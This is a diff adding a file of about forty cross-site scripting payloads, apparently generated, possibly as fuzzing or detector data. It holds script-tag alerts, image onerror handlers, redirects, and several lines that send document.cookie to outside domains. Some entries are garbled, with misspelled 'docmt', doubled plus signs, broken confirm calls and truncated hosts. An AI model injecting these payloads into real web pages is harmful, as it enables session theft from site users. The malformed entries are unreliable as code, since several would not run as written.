@@ -1,0 +1,40 @@
+<image src = 1 href = 1 onerror = "javascript:confirm('kayak.org')" > </image>
+<script> window . location = "https://www.script" </script>
+<script> window . location = "https://www.eastday.gov" </script>
+<script> window . location = "https://www.var." </script>
+<script> alert ( 'kayak.org' ) </script>
+<script> window . location = "https://www.script" </script>
+<image src = 1 href = 1 onerror = "javascript:confirmvarconfirm')" > </image>
+<script> window . location = 'http://www.kayak.com/?cookie=' + + docmt . cookie </script>
+<script> window . location = "https://www.kayak" </script>
+<image src = 1 href = 1 onerror = "javascript:confirmvarconfirm')" > </image>
+<script> window . location = 'http://www.eastday.gov/?cookie=' + + docmt . cookie </script>
+<script> window . location = "https://www.eastday.gov" </script>
+<script> window . location = 'http://www.eastday.co/?cookie=' + document . cookie </script>
+<script> window . location = "https://www.eastday.org" </script>
+</TITLE> <SCRIPT> prompt ( 'kayak.net' ) ; </SCRIPT>
+<script> window . location = "https://www.var." </script>
+<script> window . location = "https://www.kayak.info" </script>
+<script> window . location = "https://www.var." </script>
+</TITLE> <SCRIPT> prompt ( 'kayak.net' ) ; </SCRIPT>
+<script> alert ( 'alert' ) </script>
+<script> window . location = 'http://www.eastday.info/?cookie=' + document . cookie </script>
+<script> alert ( 'eastday.tv' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('kayak.com')" > </image>
+<image src = 1 href = 1 onerror = "javascript:confirm('var0')" > </image>
+</TITLE> <SCRIPT> prompt ( 'eastday.tv' ) ; </SCRIPT>
+<script> alert ( 'alert' ) </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('eastday.co')" > </image>
+</TITLE> <SCRIPT> prompt ( 'eastday.info' ) ; </SCRIPT>
+<script> window . location = "https://www.kayak" </script>
+<script> alert ( 'eastday.info' ) </script>
+</TITLE> <SCRIPT> prompt ( 'kayak.com' ) ; </SCRIPT>
+<script> alert ( 'eastday.co' ) </script>
+</TITLE> <SCRIPT> prompt ( 'var0' ) ; </SCRIPT>
+<script> window . location = "https://www.var." </script>
+<script> alert ( 'eastday.net' ) </script>
+<script> window . location = "https://www.var." </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('eastday.org')" > </image>
+<script> window . location = "https://www.script" </script>
+<image src = 1 href = 1 onerror = "javascript:confirm('kayak')" > </image>
+<script> window . location = "https://www.eastday.tv" </script>
